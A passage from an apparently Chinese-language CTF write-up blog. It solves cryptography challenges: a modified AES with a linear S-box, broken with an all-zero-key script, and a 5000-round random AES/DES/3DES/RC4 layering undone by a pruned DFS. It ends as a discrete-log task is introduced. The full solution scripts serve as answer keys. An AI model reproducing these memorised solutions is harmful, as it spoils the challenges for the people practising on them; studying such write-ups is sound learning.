class="number">0x90</span>, <span class="number">0xe0</span>, <span class="number">0xf0</span>, <span class="number">0xc0</span>, <span class="number">0xd0</span>, <span class="number">0xa0</span>, <span class="number">0xb0</span>,</span><br><span class="line">    <span class="number">0x02</span>, <span class="number">0x12</span>, <span class="number">0x62</span>, <span class="number">0x72</span>, <span class="number">0x42</span>, <span class="number">0x52</span>, <span class="number">0x22</span>, <span class="number">0x32</span>, <span class="number">0x83</span>, <span class="number">0x93</span>, <span class="number">0xe3</span>, <span class="number">0xf3</span>, <span class="number">0xc3</span>, <span class="number">0xd3</span>, <span class="number">0xa3</span>, <span class="number">0xb3</span>,</span><br><span class="line">    <span class="number">0x0c</span>, <span class="number">0x1c</span>, <span class="number">0x6c</span>, <span class="number">0x7c</span>, <span class="number">0x4c</span>, <span class="number">0x5c</span>, <span class="number">0x2c</span>, <span class="number">0x3c</span>, <span class="number">0x8d</span>, <span class="number">0x9d</span>, <span class="number">0xed</span>, <span class="number">0xfd</span>, <span class="number">0xcd</span>, <span class="number">0xdd</span>, <span class="number">0xad</span>, <span class="number">0xbd</span>,</span><br><span class="line">    <span class="number">0x0f</span>, <span class="number">0x1f</span>, <span class="number">0x6f</span>, <span class="number">0x7f</span>, <span class="number">0x4f</span>, <span class="number">0x5f</span>, <span class="number">0x2f</span>, <span class="number">0x3f</span>, <span class="number">0x8e</span>, <span class="number">0x9e</span>, <span class="number">0xee</span>, <span class="number">0xfe</span>, <span class="number">0xce</span>, <span class="number">0xde</span>, <span class="number">0xae</span>, <span class="number">0xbe</span>,</span><br><span class="line">    <span class="number">0x0b</span>, <span class="number">0x1b</span>, <span class="number">0x6b</span>, <span class="number">0x7b</span>, <span class="number">0x4b</span>, <span class="number">0x5b</span>, <span class="number">0x2b</span>, <span class="number">0x3b</span>, <span class="number">0x8a</span>, <span class="number">0x9a</span>, <span class="number">0xea</span>, <span class="number">0xfa</span>, <span class="number">0xca</span>, <span class="number">0xda</span>, <span class="number">0xaa</span>, <span class="number">0xba</span>,</span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x18</span>, <span class="number">0x68</span>, <span class="number">0x78</span>, <span class="number">0x48</span>, <span class="number">0x58</span>, <span class="number">0x28</span>, <span class="number">0x38</span>, <span class="number">0x89</span>, <span class="number">0x99</span>, <span class="number">0xe9</span>, <span class="number">0xf9</span>, <span class="number">0xc9</span>, <span class="number">0xd9</span>, <span class="number">0xa9</span>, <span class="number">0xb9</span>,</span><br><span class="line">    <span class="number">0x0a</span>, <span class="number">0x1a</span>, <span class="number">0x6a</span>, <span class="number">0x7a</span>, <span class="number">0x4a</span>, <span class="number">0x5a</span>, <span class="number">0x2a</span>, <span class="number">0x3a</span>, <span class="number">0x8b</span>, <span class="number">0x9b</span>, <span class="number">0xeb</span>, <span class="number">0xfb</span>, <span class="number">0xcb</span>, <span class="number">0xdb</span>, <span class="number">0xab</span>, <span class="number">0xbb</span>,</span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x19</span>, <span class="number">0x69</span>, <span class="number">0x79</span>, <span class="number">0x49</span>, <span class="number">0x59</span>, <span class="number">0x29</span>, <span class="number">0x39</span>, <span class="number">0x88</span>, <span class="number">0x98</span>, <span class="number">0xe8</span>, <span class="number">0xf8</span>, <span class="number">0xc8</span>, <span class="number">0xd8</span>, <span class="number">0xa8</span>, <span class="number">0xb8</span>,</span><br><span class="line">    <span class="number">0x0d</span>, <span class="number">0x1d</span>, <span class="number">0x6d</span>, <span class="number">0x7d</span>, <span class="number">0x4d</span>, <span class="number">0x5d</span>, <span class="number">0x2d</span>, <span class="number">0x3d</span>, <span class="number">0x8c</span>, <span class="number">0x9c</span>, <span class="number">0xec</span>, <span class="number">0xfc</span>, <span class="number">0xcc</span>, <span class="number">0xdc</span>, <span class="number">0xac</span>, <span class="number">0xbc</span>,</span><br><span class="line">    <span class="number">0x0e</span>, <span class="number">0x1e</span>, <span class="number">0x6e</span>, <span class="number">0x7e</span>, <span class="number">0x4e</span>, <span class="number">0x5e</span>, <span class="number">0x2e</span>, <span class="number">0x3e</span>, <span class="number">0x8f</span>, <span class="number">0x9f</span>, <span class="number">0xef</span>, <span class="number">0xff</span>, <span class="number">0xcf</span>, <span class="number">0xdf</span>, <span class="number">0xaf</span>, <span class="number">0xbf</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建逆 S 盒</span></span><br><span class="line">inv_stupid_box = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> idx, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(stupid_box):</span><br><span class="line">    inv_stupid_box[val] = idx</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift_rows</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([</span><br><span class="line">        m[<span class="number">0x0</span>], m[<span class="number">0x5</span>], m[<span class="number">0xa</span>], m[<span class="number">0xf</span>],</span><br><span class="line">        m[<span class="number">0x4</span>], m[<span class="number">0x9</span>], m[<span class="number">0xe</span>], m[<span class="number">0x3</span>],</span><br><span class="line">        m[<span class="number">0x8</span>], m[<span class="number">0xd</span>], m[<span class="number">0x2</span>], m[<span class="number">0x7</span>],</span><br><span class="line">        m[<span class="number">0xc</span>], m[<span class="number">0x1</span>], m[<span class="number">0x6</span>], m[<span class="number">0xb</span>]</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_shift_rows</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([</span><br><span class="line">        m[<span class="number">0x0</span>], m[<span class="number">0xd</span>], m[<span class="number">0xa</span>], m[<span class="number">0x7</span>],</span><br><span class="line">        m[<span class="number">0x4</span>], m[<span class="number">0x1</span>], m[<span class="number">0xe</span>], m[<span class="number">0xb</span>],</span><br><span class="line">        m[<span class="number">0x8</span>], m[<span class="number">0x5</span>], m[<span class="number">0x2</span>], m[<span class="number">0xf</span>],</span><br><span class="line">        m[<span class="number">0xc</span>], m[<span class="number">0x9</span>], m[<span class="number">0x6</span>], m[<span class="number">0x3</span>]</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_bytes</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(stupid_box[mm] <span class="keyword">for</span> mm <span class="keyword">in</span> m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_sub_bytes</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(inv_stupid_box[mm] <span class="keyword">for</span> mm <span class="keyword">in</span> m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mix_columns</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_gf_mul</span>(<span class="params">a, b</span>):</span><br><span class="line">        c = <span class="number">0</span></span><br><span class="line">        d = a</span><br><span class="line">        <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">reversed</span>(<span class="built_in">bin</span>(b)[<span class="number">2</span>:])):</span><br><span class="line">            <span class="keyword">if</span> bit:</span><br><span class="line">                c ^= d</span><br><span class="line">            d = d &lt;&lt; <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> d &amp; <span class="number">0x100</span>:</span><br><span class="line">                d ^= <span class="number">0x11b</span></span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_mix_column</span>(<span class="params">col</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">2</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">3</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">1</span>),</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">2</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">3</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">1</span>),</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">2</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">3</span>),</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">3</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">2</span>)</span><br><span class="line">        ])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([</span><br><span class="line">        *_mix_column(m[:<span class="number">4</span>]),</span><br><span class="line">        *_mix_column(m[<span class="number">4</span>:<span class="number">8</span>]),</span><br><span class="line">        *_mix_column(m[<span class="number">8</span>:<span class="number">12</span>]),</span><br><span class="line">        *_mix_column(m[<span class="number">12</span>:<span class="number">16</span>])</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_mix_columns</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_gf_mul</span>(<span class="params">a, b</span>):</span><br><span class="line">        c = <span class="number">0</span></span><br><span class="line">        d = a</span><br><span class="line">        <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">reversed</span>(<span class="built_in">bin</span>(b)[<span class="number">2</span>:])):</span><br><span class="line">            <span class="keyword">if</span> bit:</span><br><span class="line">                c ^= d</span><br><span class="line">            d = d &lt;&lt; <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> d &amp; <span class="number">0x100</span>:</span><br><span class="line">                d ^= <span class="number">0x11b</span></span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_inv_mix_column</span>(<span class="params">col</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">14</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">11</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">13</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">9</span>),</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">9</span>)  ^ _gf_mul(col[<span class="number">1</span>], <span class="number">14</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">11</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">13</span>),</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">13</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">9</span>)  ^ _gf_mul(col[<span class="number">2</span>], <span class="number">14</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">11</span>),</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">11</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">13</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">9</span>)  ^ _gf_mul(col[<span class="number">3</span>], <span class="number">14</span>)</span><br><span class="line">        ])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([</span><br><span class="line">        *_inv_mix_column(m[:<span class="number">4</span>]),</span><br><span class="line">        *_inv_mix_column(m[<span class="number">4</span>:<span class="number">8</span>]),</span><br><span class="line">        *_inv_mix_column(m[<span class="number">8</span>:<span class="number">12</span>]),</span><br><span class="line">        *_inv_mix_column(m[<span class="number">12</span>:<span class="number">16</span>])</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_round_key</span>(<span class="params">m, k</span>):</span><br><span class="line">    <span class="keyword">return</span> xor(m, k)</span><br><span class="line"></span><br><span class="line">RCON = [<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1B</span>, <span class="number">0x36</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_schedule</span>(<span class="params">k</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(k) == <span class="number">16</span></span><br><span class="line">    sub_keys = [k]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        sub_key = <span class="built_in">bytes</span>(</span><br><span class="line">            stupid_box[w1] ^ w2 ^ rr</span><br><span class="line">                <span class="keyword">for</span> w1, w2, rr <span class="keyword">in</span> <span class="built_in">zip</span>(</span><br><span class="line">                    sub_keys[-<span class="number">1</span>][<span class="number">13</span>:] + sub_keys[-<span class="number">1</span>][<span class="number">12</span>:<span class="number">13</span>],</span><br><span class="line">                    sub_keys[-<span class="number">1</span>][:<span class="number">4</span>],</span><br><span class="line">                    (RCON[i], <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">                )</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            sub_key += xor(sub_keys[-<span class="number">1</span>][<span class="number">4</span>*j+<span class="number">4</span>:<span class="number">4</span>*j+<span class="number">8</span>], sub_key[<span class="number">4</span>*j:<span class="number">4</span>*j+<span class="number">4</span>])</span><br><span class="line">        sub_keys.append(sub_key)</span><br><span class="line">    <span class="keyword">return</span> sub_keys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m, k</span>):</span><br><span class="line">    sub_keys = key_schedule(k)</span><br><span class="line">    m = add_round_key(m, sub_keys[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        m = sub_bytes(m)</span><br><span class="line">        m = shift_rows(m)</span><br><span class="line">        m = mix_columns(m)</span><br><span class="line">        m = add_round_key(m, sub_keys[i+<span class="number">1</span>])</span><br><span class="line">    m = sub_bytes(m)</span><br><span class="line">    m = shift_rows(m)</span><br><span class="line">    m = add_round_key(m, sub_keys[<span class="number">10</span>])</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c, k</span>):</span><br><span class="line">    sub_keys = key_schedule(k)</span><br><span class="line">    <span class="comment"># 逆初始轮密钥加</span></span><br><span class="line">    c = add_round_key(c, sub_keys[<span class="number">10</span>])</span><br><span class="line">    c = inv_shift_rows(c)</span><br><span class="line">    c = inv_sub_bytes(c)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        c = add_round_key(c, sub_keys[i])</span><br><span class="line">        c = inv_mix_columns(c)</span><br><span class="line">        c = inv_shift_rows(c)</span><br><span class="line">        c = inv_sub_bytes(c)</span><br><span class="line">    c = add_round_key(c, sub_keys[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_ecb</span>(<span class="params">m, k</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(m) % <span class="number">16</span> == <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(k) == <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(encrypt(m[i:i+<span class="number">16</span>], k) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(m), <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知密文</span></span><br><span class="line">ct = <span class="string">b&#x27;&amp;\xa4\xe7&#123;\x94\x10cC\xf0\x8c\xaa&lt;\x1e-_\xa4\x12H\x8e;\xa2W\xd4\x85\x81\xb9\xc1\xb6\xd0ovyQ\xd5B#f-\x00\xd7\x8a\xc7\xfcs&quot;9M6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用全 0 密钥</span></span><br><span class="line">k0 = <span class="built_in">bytes</span>(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算全 0 明文加密结果（即 encrypt(0, k0)）</span></span><br><span class="line">encrypt_0 = encrypt(<span class="built_in">bytes</span>(<span class="number">16</span>), k0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后一个明文块（全 0x10）</span></span><br><span class="line">m_n = <span class="built_in">bytes</span>([<span class="number">0x10</span>] * <span class="number">16</span>)</span><br><span class="line"><span class="comment"># 加密 m_n 得到 encrypt(m_n, k0)</span></span><br><span class="line">encrypt_m_n = encrypt(m_n, k0)</span><br><span class="line"><span class="comment"># 计算 L(m_n) = encrypt(m_n, k0) XOR encrypt_0</span></span><br><span class="line">L_mn = xor(encrypt_m_n, encrypt_0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分割密文块</span></span><br><span class="line">ct_blocks = [ct[i:i+<span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ct), <span class="number">16</span>)]</span><br><span class="line">ct_n = ct_blocks[-<span class="number">1</span>]  <span class="comment"># 最后一个密文块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算常数 C(k) = ct_n XOR L_mn</span></span><br><span class="line">C_k = xor(ct_n, L_mn)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对每个密文块解密</span></span><br><span class="line">plain_blocks = []</span><br><span class="line"><span class="keyword">for</span> ct_i <span class="keyword">in</span> ct_blocks:</span><br><span class="line">    tmp = xor(xor(ct_i, C_k), encrypt_0)</span><br><span class="line">    m_i = decrypt(tmp, k0)</span><br><span class="line">    plain_blocks.append(m_i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并明文块</span></span><br><span class="line">plain = <span class="string">b&#x27;&#x27;</span>.join(plain_blocks)</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>拓展:所谓”线性”是什么东西?<br>答案:满足</p>
<script type="math/tex; mode=display">f(x\,\mathrm{xor}\, y)=f(x)\,\mathrm{xor} \,f(y)\mathrm{xor} \,c</script><p>其中c是一个常数,我们称这个盒子是线性的.<br>这会导致所有轮密钥每轮加密可以被视作只有一个密钥加密,这个时候解密脚本呼之欲出,交给ds了…</p>
</blockquote>
<h2 id="神秘题"><a href="#神秘题" class="headerlink" title="神秘题"></a>神秘题</h2><h3 id="task1-1"><a href="#task1-1" class="headerlink" title="task1"></a>task1</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4, DES, DES3, AES</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random, os</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">32</span></span><br><span class="line">functions = [</span><br><span class="line">    <span class="keyword">lambda</span> data: AES.new(<span class="string">b&#x27;DEADBEEFcafebabe&#x27;</span>, AES.MODE_ECB).encrypt(pad(data, <span class="number">16</span>)),</span><br><span class="line">    <span class="keyword">lambda</span> data: AES.new(<span class="string">b&#x27;deadc0de!@#$%^&amp;*&#x27;</span>, AES.MODE_ECB).encrypt(pad(data, <span class="number">16</span>)),</span><br><span class="line">    <span class="keyword">lambda</span> data: DES.new(<span class="string">b&#x27;deadbeef&#x27;</span>, DES.MODE_ECB).encrypt(pad(data, <span class="number">16</span>)),</span><br><span class="line">    <span class="keyword">lambda</span> data: DES.new(<span class="string">b&#x27;13572468&#x27;</span>, DES.MODE_ECB).encrypt(pad(data, <span class="number">16</span>)),</span><br><span class="line">    <span class="keyword">lambda</span> data: DES3.new(<span class="string">b&#x27;13572468abcdefgh1!2@3#4$&#x27;</span>, DES3.MODE_ECB).encrypt(pad(data, <span class="number">16</span>)),</span><br><span class="line">    <span class="keyword">lambda</span> data: DES3.new(<span class="string">b&#x27;qazwsxedcrfvtgbyhnujmik,&#x27;</span>, DES3.MODE_ECB).encrypt(pad(data, <span class="number">16</span>)),</span><br><span class="line">    <span class="keyword">lambda</span> data: ARC4.new(<span class="string">b&#x27;never gonna give you up&#x27;</span>).encrypt(data + os.urandom(<span class="number">16</span>)),</span><br><span class="line">    <span class="keyword">lambda</span> data: ARC4.new(<span class="string">b&#x27;never gonna let you down&#x27;</span>).encrypt(data + os.urandom(<span class="number">16</span>))</span><br><span class="line">]</span><br><span class="line">ct = pad(flag, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">    <span class="keyword">for</span> function <span class="keyword">in</span> random.sample(functions, <span class="number">3</span>):</span><br><span class="line">        ct = function(ct)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ct = bytes.fromhex(&#x27;<span class="subst">&#123;ct.<span class="built_in">hex</span>()&#125;</span>&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>可以看到,上述加密方式”随机”选了5000组加密方式,且每组从上述8个方式里面选3个不重的进行加密.<br>尝试构造解密脚本,大方向是dfs.想想怎么剪枝:<br><strong>pad(s,16)</strong> 这实际上是给一个固定尾巴的函数,如果s本身就是16的倍数,就会在末尾补上16个 <code>/x10</code> (16),否则pad会补齐s为16的倍数,设差为del,那么就会补齐del个del.<br>所以对于前六个加密,我们可以通过判断尾巴是不是16个16来判断解密是否成功.<br>然而对于后两个加密,无论什么长度都不会报错,且没有明显尾巴,考虑分布:<br>对于每次从8个选3个最后拼一起的情况,任意一段加密方式中,连续的ARC不会超过4,所以设置一个上限即可.<br>具体地:如果前6个解密出现了尾巴那么一定是前六个,否则再考虑用ARC4解密.<br>脚本如下(因为原先flag就是16倍数,所以只会补齐16个16,不用管其他状况,如果不减枝挨个算会算一上午都算不出来…):</p>
<p>PS: <code>for: xx else: xx</code> 是python的语法,意思是如果for循环内没有break就进入else语句中执行.<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">tail=<span class="string">b&#x27;\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10&#x27;</span></span><br><span class="line">defunc = [</span><br><span class="line">	<span class="keyword">lambda</span> data: AES.new(<span class="string">b&#x27;DEADBEEFcafebabe&#x27;</span>, AES.MODE_ECB).decrypt(data),</span><br><span class="line">	<span class="keyword">lambda</span> data: AES.new(<span class="string">b&#x27;deadc0de!@#$%^&amp;*&#x27;</span>, AES.MODE_ECB).decrypt(data),</span><br><span class="line">	<span class="keyword">lambda</span> data: DES.new(<span class="string">b&#x27;deadbeef&#x27;</span>, DES.MODE_ECB).decrypt(data),</span><br><span class="line">	<span class="keyword">lambda</span> data: DES.new(<span class="string">b&#x27;13572468&#x27;</span>, DES.MODE_ECB).decrypt(data),</span><br><span class="line">	<span class="keyword">lambda</span> data: DES3.new(<span class="string">b&#x27;13572468abcdefgh1!2@3#4$&#x27;</span>, DES3.MODE_ECB).decrypt(data),</span><br><span class="line">	<span class="keyword">lambda</span> data: DES3.new(<span class="string">b&#x27;qazwsxedcrfvtgbyhnujmik,&#x27;</span>, DES3.MODE_ECB).decrypt(data),</span><br><span class="line">	<span class="keyword">lambda</span> data: ARC4.new(<span class="string">b&#x27;never gonna give you up&#x27;</span>).decrypt(data),</span><br><span class="line">	<span class="keyword">lambda</span> data: ARC4.new(<span class="string">b&#x27;never gonna let you down&#x27;</span>).decrypt(data)</span><br><span class="line">]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">s,num,pre</span>):</span><br><span class="line">	<span class="keyword">if</span> num&gt;<span class="number">5000</span>*<span class="number">3</span>:</span><br><span class="line">		<span class="keyword">global</span> cnt</span><br><span class="line">		cnt+=<span class="number">1</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">		<span class="built_in">print</span>(s)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> defunc[:<span class="number">6</span>]:</span><br><span class="line">		ss=i(s)</span><br><span class="line">		<span class="keyword">if</span> ss[-<span class="number">16</span>:]==tail:</span><br><span class="line">			dfs(ss[:-<span class="number">16</span>],num+<span class="number">1</span>,<span class="number">4</span>)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">if</span> pre&lt;=<span class="number">0</span>:</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> defunc[<span class="number">6</span>:]:</span><br><span class="line">			ss=i(s)</span><br><span class="line">			dfs(ss[:-<span class="number">16</span>],num+<span class="number">1</span>,pre-<span class="number">1</span>)</span><br><span class="line">dfs(ct,<span class="number">1</span>,<span class="number">4</span>)</span><br></pre></td></tr></table></figure></p>
<h3 id="task2-1"><a href="#task2-1" class="headerlink" title="task2"></a>task2</h3><p>给定一个 $5^m\equiv h\mod p$ ,尝试求出m.<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;Spirit&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) &lt; <span class="number">64</span></span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> m, l: m + <span class="built_in">bytes</span>(<span class="number">114</span>*<span class="built_in">bool</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="built_in">len</span>(m)))</span><br><span class="line">unpad = <span class="keyword">lambda</span> m: m[:m.index(<span class="number">0</span>)] <span class="keyword">if</span> <span class="number">0</span> <span class="keyword">in</span> m <span class="keyword">else</span> m</span><br><span class="line"></span><br><span class="line">flag = pad(flag, <span class="number">143</span>)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = ...</span><br><span class="line">g = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;h =&#x27;</span>, <span class="built_in">pow</span>(g, m, p))</span><br><span class="line">h = ...</span><br></pre></td></tr></table></figure><br>这是一个典型的离散对数问题,但是p特别特别大.</p>
